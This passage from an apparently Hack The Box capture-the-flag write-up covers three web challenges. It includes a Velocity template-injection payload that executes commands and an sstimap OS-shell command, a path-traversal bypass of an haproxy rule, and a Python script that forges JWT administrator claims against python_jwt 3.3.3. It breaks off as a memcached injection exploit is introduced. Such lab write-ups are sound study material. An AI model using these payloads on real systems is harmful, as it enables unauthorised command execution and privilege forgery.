<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">curl.exe </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">http://94.237.49.166:35229/</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> -X POST --data-raw </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">text=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22whoami%22)</span><span style="color: #89DDFF">'</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>However, i had a hard time getting the flag since i wasn’t able to get a reverse shell or place some special characters in the command. This seemed like a dead end for a second. But then i fired up <code>sstimap</code> against it.
And to my surprise i was able to get an OS Shell directly without having to do the CVE exploit: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">python3 sstimap.py --url http://94.237.49.166:35229/ -f --os-shell --engine velocity</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Get the flag</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">cat /flag*</span></div></code></div></pre><!-- HTML_TAG_END -->
<h3 id="locktalk"><a href="#locktalk">LockTalk</a></h3>
<p>It was a flask application with haproxy in front of the application. Reviewing the code, i found 3 APIs that i can request: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">@</span><span style="color: #82AAFF">api_blueprint</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">route</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/get_ticket</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">methods</span><span style="color: #89DDFF">=[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">GET</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">get_ticket</span><span style="color: #89DDFF">():</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    claims </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">role</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">guest</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">user</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">guest_user</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span></div><div class='line'><span style="color: #EEFFFF">    token </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> jwt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">generate_jwt</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">claims</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> current_app</span><span style="color: #89DDFF">.</span><span style="color: #F07178">config</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">get</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">JWT_SECRET_KEY</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">),</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">PS256</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> datetime</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">timedelta</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">minutes</span><span style="color: #89DDFF">=</span><span style="color: #F78C6C">60</span><span style="color: #89DDFF">))</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">jsonify</span><span style="color: #89DDFF">(&#123;</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">ticket: </span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">:</span><span style="color: #82AAFF"> token</span><span style="color: #89DDFF">&#125;)</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #89DDFF">@</span><span style="color: #82AAFF">api_blueprint</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">route</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/chat/&lt;int:chat_id&gt;</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">methods</span><span style="color: #89DDFF">=[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">GET</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #89DDFF">@</span><span style="color: #82AAFF">authorize_roles</span><span style="color: #89DDFF">([</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">guest</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">administrator</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">chat</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">chat_id</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">  ...</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">@</span><span style="color: #82AAFF">api_blueprint</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">route</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/flag</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">methods</span><span style="color: #89DDFF">=[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">GET</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #89DDFF">@</span><span style="color: #82AAFF">authorize_roles</span><span style="color: #89DDFF">([</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">administrator</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">flag</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">jsonify</span><span style="color: #89DDFF">(&#123;</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">message</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">:</span><span style="color: #82AAFF"> current_app</span><span style="color: #89DDFF">.</span><span style="color: #F07178">config</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">get</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">FLAG</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)&#125;),</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">200</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>The goal here is to generate a ticket and somehow modify the claim so that the role we use is of administrator. However, we can’t simply request the <code>/get_ticket</code> api because of <code>haproxy</code>: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">global</span></div><div class='line'><span style="color: undefined">    daemon</span></div><div class='line'><span style="color: undefined">    maxconn 256</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">defaults</span></div><div class='line'><span style="color: undefined">    mode http</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">    timeout connect 5000ms</span></div><div class='line'><span style="color: undefined">    timeout client 50000ms</span></div><div class='line'><span style="color: undefined">    timeout server 50000ms</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">frontend haproxy</span></div><div class='line'><span style="color: undefined">    bind 0.0.0.0:1337</span></div><div class='line'><span style="color: undefined">    default_backend backend</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">    http-request deny if &#123; path_beg,url_dec -i /api/v1/get_ticket &#125;</span></div><div class='line'><span style="color: undefined">    </span></div><div class='line'><span style="color: undefined">backend backend</span></div><div class='line'><span style="color: undefined">    balance roundrobin</span></div><div class='line'><span style="color: undefined">    server s1 0.0.0.0:5000 maxconn 32 check</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>I bypassed the filter rule with the simple listing: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">curl http://localhost:1337/../api/v1/get_ticket -i --path-as-is</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>The above returned me with the <code>JWT</code> token needed. </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Now, checking the requirements of project, i found <code>python_jwt==3.3.3</code>:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">uwsgi</span></div><div class='line'><span style="color: undefined">Flask</span></div><div class='line'><span style="color: undefined">requests</span></div><div class='line'><span style="color: undefined">python_jwt==3.3.3</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Heading to google, i found a security advisory of the project on Github: <a href="https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp" rel="nofollow noopener noreferrer external" target="_blank">https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp</a></p>
<p>It seems as if i can modify the claims of the JWT for versions <code>&lt;3.3.4</code></p>
<p><img src="https://github.com/hash3liZer/khatta/assets/29171692/758bd543-0d9a-4543-a1a1-7d7f43cb4fb8" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<p>In one of the commits of the repo of fixing this issue i found a code that i the modified to write my own exploit. Make sure to replace the token in the <code>create</code> method:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> datetime </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> timedelta</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> json </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> loads</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> dumps</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> python_jwt </span><span style="color: #89DDFF">as</span><span style="color: #EEFFFF"> jwt</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> pyvows </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> Vows</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> expect</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> jwcrypto</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">common </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> base64url_decode</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> base64url_encode</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> pprint </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> pprint</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">ForgedClaims</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">create</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">"""</span><span style="color: #546E7A"> Generate token </span><span style="color: #89DDFF">"""</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #546E7A"># payload = &#123;'sub': 'alice'&#125;</span></div><div class='line'><span style="color: #EEFFFF">        token </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> token</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">topic</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> topic</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">"""</span><span style="color: #546E7A"> Use mix of JSON and compact format to insert forged claims including long expiration </span><span style="color: #89DDFF">"""</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">[</span><span style="color: #EEFFFF">header</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> payload</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> signature</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> topic</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">split</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">.</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        parsed_payload </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">loads</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">base64url_decode</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">payload</span><span style="color: #89DDFF">))</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">parsed_payload</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        parsed_payload</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">role</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">administrator</span><span style="color: #89DDFF">'</span></div><div class='line'><span style="color: #EEFFFF">        parsed_payload</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">user</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">admin_user</span><span style="color: #89DDFF">'</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">parsed_payload</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #546E7A"># parsed_payload['exp'] = 2000000000</span></div><div class='line'><span style="color: #EEFFFF">        fake_payload </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">base64url_encode</span><span style="color: #89DDFF">((</span><span style="color: #82AAFF">dumps</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">parsed_payload</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">separators</span><span style="color: #89DDFF">=(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">,</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">:</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">))))</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">&#123;"  </span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> header </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">.</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> fake_payload </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">.":"","protected":"</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> header </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">", "payload":"</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> payload </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">","signature":"</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> signature </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">"&#125;</span><span style="color: #89DDFF">'</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">claime__ </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">ForgedClaims</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #EEFFFF">jwt </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> claime__</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">create</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">claime__</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">topic</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">jwt</span><span style="color: #89DDFF">))</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>I ran the code and got the following payload: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">&#123;"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW5fdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA"&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Note that we need to place the payload as it is as our new JWT token to make it work:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">curl -i </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://94.237.60.112:35242/api/v1/flag</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> -H </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">Authorization: &#123;"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW5fdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA"&#125;</span><span style="color: #89DDFF">'</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>And got the flag:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">HTB&#123;h4Pr0Xy_n3v3r_D1s@pp01n4s&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<h3 id="serialflow"><a href="#serialflow">SerialFlow</a></h3>
<p>Analyzing the code of the application, i got that application is using the library <code>flask-session</code> with <code>pylibmc</code> to store sessions in memcached. </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> pylibmc</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> uuid</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> sys</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> flask </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> Flask</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> session</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> request</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> redirect</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> render_template</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> flask_session </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> Session</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">app </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">Flask</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">__name__</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #F07178">secret_key</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> uuid</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">uuid4</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #F07178">config</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">SESSION_TYPE</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">memcached</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #F07178">config</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">SESSION_MEMCACHED</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> pylibmc</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Client</span><span style="color: #89DDFF">([</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">127.0.0.1:11211</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #F07178">config</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">from_object</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">__name__</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #82AAFF">Session</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">app</span><span style="color: #89DDFF">)</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>At this point, i thougt it would be a plain memcached injection but nothing. Doing a bit of google i found various articles on memcached injection with other libraries from Python. However, i found this one blog on <code>pylibmc</code> exploitation: <a href="https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/" rel="nofollow noopener noreferrer external" target="_blank">https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/</a></p>
<p>Reading the blog, i got that we can do a memcached injection with <code>pylibmc</code> by using carriage return line breaks by encoding the payload in a special sequence that is being understood by the HTTP protocol. However, the tricky part for me was to identify where to place the payload. In the blog, the author used a cookie named <code>notsecret</code> which i wasn’t sure of. After spending some more time on this, i found the author’s twitter where he attached a GIF of the exploit and used it as the session cookie. </p>
<p>The good thing was we got the exploit code from the blog. I modified it a bit to send request to my <code>ngrok</code> server:</p>
